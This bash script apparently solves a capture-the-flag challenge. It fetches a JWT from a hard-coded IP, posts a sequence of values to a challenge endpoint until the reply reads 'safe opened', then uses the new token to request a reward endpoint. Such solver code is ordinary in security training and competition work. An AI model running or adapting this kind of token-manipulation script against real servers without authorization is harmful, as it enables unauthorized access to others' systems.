#!/bin/bash
B=http://117.72.42.214:8080
JWT=$(curl -sS -m 15 $B/api/ticket | grep -o 'eyJ[A-Za-z0-9_.-]*' | head -1)
for s in 1 3 5 7 9 2 4 6 8 10; do
  R=$(curl -sS -m 15 -i -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "{\"seq\": $s}" $B/api/challenge)
  if echo "$R" | grep -q "保险箱已打开"; then
    NEW=$(echo "$R" | grep -o 'eyJ[A-Za-z0-9_.-]*' | head -1)
    echo "NEW_JWT=$NEW"
  fi
done
echo "--- GET /api/reward with new JWT ---"
curl -sS -m 15 -i -H "Authorization: Bearer $NEW" $B/api/reward 2>&1 | head -60
